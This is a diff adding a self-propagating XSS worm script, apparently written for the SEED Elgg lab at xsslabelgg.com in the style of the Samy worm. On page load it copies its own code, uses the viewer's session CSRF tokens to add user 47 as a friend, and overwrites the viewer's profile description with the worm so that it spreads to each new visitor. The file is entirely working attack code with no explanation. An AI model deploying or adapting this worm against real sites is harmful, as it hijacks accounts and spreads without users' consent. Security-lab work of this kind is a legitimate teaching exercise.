@@ -1,0 +1,49 @@
+<script id = worm>
+	window.onload = function(){
+		
+		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+		var jsCode = document.getElementById("worm").innerHTML;
+		var tailTag = "</" + "script>";
+		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+		alert(jsCode);
+		add();
+		edit();
+
+		function add(){
+		
+			var Ajax = null;
+			var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
+			var token = "&__elgg_token="+elgg.security.token.__elgg_token;
+			var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
+
+			Ajax = new XMLHttpRequest();
+			Ajax.open("GET", sendurl, true);
+			Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			Ajax.send();
+		}
+		
+		function edit(){
+
+			var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+			var userName = elgg.session.user.name;
+			var guid = "&guid="+elgg.session.user.guid;
+			var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
+			var token = "&__elgg_token="+elgg.security.token.__elgg_token;
+			var content = token+ts+"&name="+userName+"&description="+wormCode+"&accesslevel%5Bdescription%5D=2&briefdescription=I+am+Victim&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2" + guid;
+			var samyGuid = 47;
+			
+			if(elgg.session.user.guid!=samyGuid) {
+				
+				var Ajax = null;
+
+				Ajax = new XMLHttpRequest();
+				Ajax.open("POST", sendurl, true);
+				Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+				Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+				Ajax.send(content);
+			}
+		}
+	}
+</script>
